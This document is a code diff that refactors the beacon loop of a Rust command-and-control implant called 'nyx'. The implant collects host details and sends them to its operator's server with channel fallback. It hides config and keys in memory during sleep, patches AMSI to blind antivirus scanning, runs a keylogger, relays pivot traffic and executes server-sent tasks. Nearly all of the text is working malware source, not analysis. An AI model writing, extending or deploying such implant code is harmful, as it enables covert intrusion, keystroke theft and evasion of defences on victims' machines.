@@ -74,8 +74,26 @@ pub fn evasion_active() -> bool {
     EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire)
 }
 
-/// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
-pub unsafe fn beacon_loop() {
+// ── Beacon state ────────────────────────────────────────────────────────────
+
+/// Initialization state passed from [`beacon_init`] to the main loop.
+struct BeaconInit {
+    cfg: Config,
+    implant: ImplantConfig,
+    kp: ImplantKeypair,
+    key: nyx_protocol::crypto::SessionKey,
+    pubkey: [u8; 32],
+    info_plain: Vec<u8>,
+    rt: Option<&'static crate::syscalls::Runtime>,
+    ch_ctx: crate::channels::ChannelCtx,
+}
+
+// ── Initialization ──────────────────────────────────────────────────────────
+
+/// Load config, build keypair, enumerate host, and initialize channels.
+/// Returns the beacon state on success, or returns early (via the caller)
+/// when the CSPRNG fails.
+unsafe fn beacon_init() -> Option<BeaconInit> {
     crate::entry::diag_mark(b"L0_loop_start");
     // Try per-implant runtime config first (patched .nyx_cfg section).
     // Falls back to compile-time config if the section is unpatched.
@@ -89,36 +107,30 @@ pub unsafe fn beacon_loop() {
     SLEEP_SECS.store(cfg.sleep_seconds, core::sync::atomic::Ordering::Relaxed);
 
     // Leak the decrypted config plaintext and register it with the memory
-    // mask so it is RC4-encrypted during sleep — a memory scan mid-sleep
-    // sees ciphertext, not cleartext server_host/beacon_uri strings.
+    // mask so it is RC4-encrypted during sleep.
     crate::mem::register_owned(config_plain);
 
-    // Initialize the channel dispatcher with the beacon's config + primary
-    // channel. The dispatcher replaces the old direct `channel_post_frame`
-    // call — all transport now flows through `channels::dispatch_send_recv`.
+    // Initialize the channel dispatcher.
     let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
     crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
 
-    // Per-implant keypair: if the server patched an implant private key, use it.
-    // Otherwise generate a fresh ephemeral keypair (compile-time / dev path).
+    // Per-implant keypair.
     let kp = if let Some(ref priv_bytes) = implant.implant_priv {
-        // Use the per-implant baked keypair instead of generating a new one.
         ImplantKeypair::from_secret_bytes(*priv_bytes)
     } else {
         match ImplantKeypair::generate() {
             Ok(k) => k,
             Err(_) => {
                 crate::entry::diag_mark(b"ERR_KEYGEN_CSPRNG");
-                return;
+                return None;
             }
         }
     };
     let key = kp.session_key(&cfg.server_pub);
-    // Register the session key (ECDH-derived, 32 bytes) as a maskable region.
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
 
-    // Real host enumeration (replaces the M0 "host"/"user"/0/0x1337 placeholders).
+    // Real host enumeration.
     let info = SessionInfo {
         beacon_id: crate::hostinfo::beacon_id(),
         hostname: crate::hostinfo::hostname(),
@@ -127,40 +139,37 @@ pub unsafe fn beacon_loop() {
         arch: crate::hostinfo::arch(),
         pid: crate::hostinfo::pid(),
         is_admin: crate::hostinfo::is_admin(),
-        auth_token: implant.auth_token, // per-implant one-time token (None for legacy)
+        auth_token: implant.auth_token,
     };
     let mut info_writer = Writer::new();
-    // P0-4: a panic here would abort the beacon. SessionInfo fields are tightly
-    // bounded (hostname/user/os host strings + a 32-byte auth_token), so this
-    // branch is effectively unreachable — but under panic=abort we must not
-    // let a malformed Writer state kill the process. Bail out cleanly instead.
     if info.encode(&mut info_writer).is_err() {
         crate::entry::diag_mark(b"ERR_SESSIONINFO_ENCODE");
-        return;
+        return None;
     }
     let info_plain = info_writer.into_bytes();
-
-    // Borrow the indirect-syscall runtime (initialized by entry). File ops fall
-    // back to an explicit error if it isn't up — they cannot run without it.
     let rt = crate::syscalls::global();
     crate::entry::diag_mark(b"L1_rt");
 
-    // ---- check-in (retry, capped) ----
-    // M2: cap the check-in retries. If the server registers the session but the
-    // response is lost, the next retry carries counter=1 with a SessionInfo
-    // payload, but the server now sees an EXISTING session and tries to decode
-    // it as a TaskResponse → 400 → infinite retry loop. After MAX_CHECKIN_RETRIES
-    // failed attempts, give up on check-in and fall through to the task loop:
-    // the server has our session, and the next beacon cycle (counter+1, empty
-    // TaskResponse batch) will be handled as a normal existing-session beacon.
+    Some(BeaconInit { cfg, implant, kp, key, pubkey, info_plain, rt, ch_ctx })
+}
+
+// ── Check-in ────────────────────────────────────────────────────────────────
+
+/// Run the check-in retry loop. Returns the next frame counter on success,
+/// or 0 to signal the caller to fall through to the task loop anyway
+/// (the server may have registered us even if we didn't get a reply).
+unsafe fn beacon_checkin(
+    pubkey: &[u8; 32],
+    key: &nyx_protocol::crypto::SessionKey,
+    info_plain: &[u8],
+    cfg: &Config,
+    ch_ctx: &crate::channels::ChannelCtx,
+) -> u64 {
     const MAX_CHECKIN_RETRIES: u32 = 5;
     let mut counter = 0u64;
     let mut attempts = 0u32;
     loop {
-        // Seal failure (AEAD alloc failure — infallible in practice) is now a
-        // Result. Under panic=abort the pre-fix path would have torn the
-        // process down; instead we retry the next iteration after a sleep.
-        let frame = match encode_frame(&pubkey, counter, &key, &info_plain) {
+        let frame = match encode_frame(pubkey, counter, key, info_plain) {
             Ok(f) => f,
             Err(_) => {
                 sleep_jitter(
@@ -172,160 +181,173 @@ pub unsafe fn beacon_loop() {
         };
         counter += 1;
         crate::entry::diag_mark(b"L2_checkin_send");
-        let resp = unsafe {
-            crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame)
-        };
+        let resp = crate::channels::dispatch_send_recv(ch_ctx, crate::channels::get_active(), &frame);
         crate::entry::diag_mark(b"L3_checkin_recv");
         if resp.is_some() {
-            break;
+            return counter;
         }
         attempts += 1;
         if attempts >= MAX_CHECKIN_RETRIES {
-            // Server may have registered us but the response was lost. Proceed
-            // to the task loop — the next beacon cycle will work (server treats
-            // us as an existing session).
-            break;
+            return counter;
         }
         sleep_jitter(
             SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed),
             cfg.jitter_pct,
         );
     }
+}
 
-    // ---- task loop ----
-    let mut pending: Vec<TaskResponse> = Vec::new();
-    let mut cycle: u32 = 0;
-    let mut amsi_patched = false;
-    loop {
-        // Kill-date enforcement (CRITICAL-18 from the 2026-07-21 audit).
-        // `implant.expires_at` is decoded from the config blob (0 = no expiry)
-        // but v0.3.0 never checked it. We now compare against the wall clock
-        // once per cycle and return cleanly on expiry (mirrors Command::Exit).
-        // now_unix()==0 means the clock couldn't be resolved — do NOT enforce
-        // in that case (would kill the beacon on a clock failure).
-        if implant.expires_at != 0 {
-            let now = crate::hostinfo::now_unix();
-            if now != 0 && now >= implant.expires_at {
-                return;
-            }
-        }
-        // Retry AMSI blinding: capped at 10 cycles (amsi.dll demand-loads only
-        // when a scanner starts). After cycle 10 or on success, stop the PEB
-        // walk to eliminate the per-cycle IOC.
-        if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) && !amsi_patched && cycle < 10 {
-            unsafe {
-                crate::blind::maybe_patch_amsi();
-            }
-            amsi_patched = crate::blind::amsi_patched();
-        }
-        let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
-        cycle = cycle.saturating_add(1);
-        // Pump window messages once per cycle. rundll32 creates a hidden window
-        // and expects the entry function to handle messages — if we block in an
-        // infinite loop without pumping, the system kills the process for being
-        // unresponsive. PeekMessageW/DispatchMessageW are resolved via PEB walk.
-        pump_window_messages();
-        sleep_jitter(secs, cfg.jitter_pct);
-        // Sample the keyboard once per cycle while the keylogger is active.
-        // poll_once self-guards on KEYLOG_ACTIVE, so an unconditional call is
-        // a no-op when keylogging isn't running — no extra cost in the common
-        // case. (Coarse: ~1 sample per sleep interval — see keylog.rs docs.)
-        if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
-            crate::keylog::poll_once();
-        }
+// ── Per-cycle helpers ───────────────────────────────────────────────────────
 
-        // Drain relay sockets — bytes read since last cycle ride as Channel
-        // data on this POST. task_id 0 marks async channel data (correlated by
-        // Response::Channel.chan on the operator side, not by task_id).
-        if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
-            for r in crate::pivot::pump_channels() {
-                pending.push(TaskResponse {
-                    task_id: 0,
-                    response: r,
-                });
-            }
+/// Enforce kill-date, retry AMSI blinding, sleep, pump messages, poll keylog,
+/// drain relay sockets. Returns true if the beacon should continue.
+fn beacon_cycle_setup(
+    implant: &ImplantConfig,
+    cycle: &mut u32,
+    amsi_patched: &mut bool,
+    cfg: &Config,
+    pending: &mut Vec<TaskResponse>,
+) -> bool {
+    // Kill-date enforcement.
+    if implant.expires_at != 0 {
+        let now = crate::hostinfo::now_unix();
+        if now != 0 && now >= implant.expires_at {
+            return false;
         }
+    }
+    // Retry AMSI blinding: capped at 10 cycles.
+    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire)
+        && !*amsi_patched
+        && *cycle < 10
+    {
+        unsafe { crate::blind::maybe_patch_amsi(); }
+        *amsi_patched = crate::blind::amsi_patched();
+    }
+    let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
+    *cycle = cycle.saturating_add(1);
+    pump_window_messages();
+    sleep_jitter(secs, cfg.jitter_pct);
+    // Poll keyboard once per cycle.
+    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
+        crate::keylog::poll_once();
+    }
+    // Drain relay sockets.
+    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
+        for r in crate::pivot::pump_channels() {
+            pending.push(TaskResponse { task_id: 0, response: r });
+        }
+    }
+    true
+}
 
-        // P0-4: encode_batch replaces any oversized Response with an Err so the
-        // frame always encodes instead of aborting the beacon when a screenshot
-        // BMP or BOF output exceeds MAX_BLOB_LEN.
-        // Seal failure → drop the batch this cycle and retry next cycle (the
-        // responses stay in `pending` because we only clear on success below).
-        let frame = match encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending)) {
-            Ok(f) => f,
-            Err(_) => continue,
-        };
-        counter += 1;
-        pending.clear();
-
-        let body = unsafe {
-            crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame)
-        };
-        let Some(body) = body else {
-            // Channel failed — try fallback before giving up on this cycle.
+/// Encode + send the pending batch, advancing counter on success.
+/// On send failure, tries fallback channels.
+fn beacon_send_frame(
+    pubkey: &[u8; 32],
+    counter: &mut u64,
+    key: &nyx_protocol::crypto::SessionKey,
+    pending: &mut Vec<TaskResponse>,
+    ch_ctx: &crate::channels::ChannelCtx,
+) -> Option<Vec<u8>> {
+    let frame = match encode_frame(pubkey, *counter, key, &encode_batch(pending)) {
+        Ok(f) => f,
+        Err(_) => return None,
+    };
+    *counter += 1;
+    pending.clear();
+    // SAFETY: same contract as the beacon_loop call sites — `ch_ctx` outlives
+    // the call and the active channel's fns were resolved at bootstrap.
+    let body = unsafe {
+        crate::channels::dispatch_send_recv(ch_ctx, crate::channels::get_active(), &frame)
+    };
+    match body {
+        Some(b) => Some(b),
+        None => {
             let active = crate::channels::get_active();
             if let Some(fb) = crate::channels::next_fallback(active) {
                 crate::channels::set_active(fb);
             } else {
-                // Fallback chain exhausted — reset to primary for next cycle.
                 crate::channels::set_active(crate::channels::PRIMARY_CHANNEL);
             }
-            continue;
-        };
+            None
+        }
+    }
+}
 
-        let Ok(raw) = parse_frame(&body) else {
-            continue;
-        };
-        // Server replies are sealed with Direction::ServerToClient; open with
-        // the matching direction or the AEAD tag check fails.
-        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else {
-            continue;
-        };
-        let Ok(tasks) = Task::decode_vec(&plaintext) else {
-            continue;
-        };
+/// Decode server reply into tasks, dispatch each command, and flush mid-cycle
+/// when the batch exceeds BATCH_FLUSH.
+unsafe fn beacon_dispatch_tasks(
+    body: &[u8],
+    key: &nyx_protocol::crypto::SessionKey,
+    pubkey: &[u8; 32],
+    counter: &mut u64,
+    cfg: &Config,
+    rt: Option<&'static crate::syscalls::Runtime>,
+    ch_ctx: &crate::channels::ChannelCtx,
+    pending: &mut Vec<TaskResponse>,
+) -> bool {
+    let Ok(raw) = parse_frame(body) else { return true };
+    let Ok(plaintext) = open_frame_dir(key, Direction::ServerToClient, &raw) else { return true };
+    let Ok(tasks) = Task::decode_vec(&plaintext) else { return true };
 
-        for t in tasks {
-            if matches!(t.command, Command::Exit) {
-                return;
-            }
-            for response in execute(rt, t.command, &mut counter, &pubkey, &key, &cfg) {
-                pending.push(TaskResponse {
-                    task_id: t.task_id,
-                    response,
-                });
-                // If the accumulated batch would exceed the frame cap, flush it
-                // now (a streamed Download/Screenshot can produce a lot).
-                if pending_batch_size(&pending) > BATCH_FLUSH {
-                    // P0-4: encode_vec can fail if a single Response blob
-                    // (screenshot BMP / BOF output) exceeds MAX_BLOB_LEN —
-                    // encode_batch swaps oversized responses for Err so the
-                    // batch always encodes instead of aborting the beacon.
-                    let frame = match encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending))
-                    {
-                        Ok(f) => f,
-                        // Seal failure: keep `pending` (do not advance counter)
-                        // so the responses are retried next cycle instead of
-                        // being dropped AND the counter desyncing from server.
-                        Err(_) => continue,
-                    };
-                    let sent = unsafe {
-                        crate::channels::dispatch_send_recv(
-                            &ch_ctx,
-                            crate::channels::get_active(),
-                            &frame,
-                        )
-                    };
-                    // P0-3: only advance the counter and clear the batch when
-                    // the send actually succeeded. On failure, keep `pending`
-                    // so it is retried next cycle; otherwise the responses are
-                    // silently dropped AND the counter desyncs from the server.
-                    if sent.is_some() {
-                        counter += 1;
-                        pending.clear();
-                    }
+    for t in tasks {
+        if matches!(t.command, Command::Exit) {
+            return false;
+        }
+        for response in execute(rt, t.command, counter, pubkey, key, cfg) {
+            pending.push(TaskResponse { task_id: t.task_id, response });
+            // Flush mid-cycle if batch nears frame cap.
+            if pending_batch_size(pending) > BATCH_FLUSH {
+                let frame = match encode_frame(pubkey, *counter, key, &encode_batch(pending)) {
+                    Ok(f) => f,
+                    Err(_) => continue,
+                };
+                let sent = crate::channels::dispatch_send_recv(
+                    ch_ctx,
+                    crate::channels::get_active(),
+                    &frame,
+                );
+                if sent.is_some() {
+                    *counter += 1;
+                    pending.clear();
                 }
             }
+        }
+    }
+    true
+}
+
+// ── Main loop ───────────────────────────────────────────────────────────────
+
+/// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
+pub unsafe fn beacon_loop() {
+    let init = match beacon_init() {
+        Some(s) => s,
+        None => return,
+    };
+    let BeaconInit { cfg, implant, key, pubkey, info_plain, rt, ch_ctx, .. } = init;
+
+    // Check-in retry.
+    let mut counter = beacon_checkin(&pubkey, &key, &info_plain, &cfg, &ch_ctx);
+
+    // Task loop.
+    let mut pending: Vec<TaskResponse> = Vec::new();
+    let mut cycle: u32 = 0;
+    let mut amsi_patched = false;
+    loop {
+        // Per-cycle setup: kill-date, AMSI, sleep, keylog, channel drain.
+        if !beacon_cycle_setup(&implant, &mut cycle, &mut amsi_patched, &cfg, &mut pending) {
+            return;
+        }
+
+        // Encode + send pending batch, receive server reply.
+        let Some(body) = beacon_send_frame(&pubkey, &mut counter, &key, &mut pending, &ch_ctx) else {
+            continue;
+        };
+
+        // Decode reply, dispatch tasks, flush mid-cycle.
+        if !beacon_dispatch_tasks(&body, &key, &pubkey, &mut counter, &cfg, rt, &ch_ctx, &mut pending) {
+            return;
         }
     }
 }
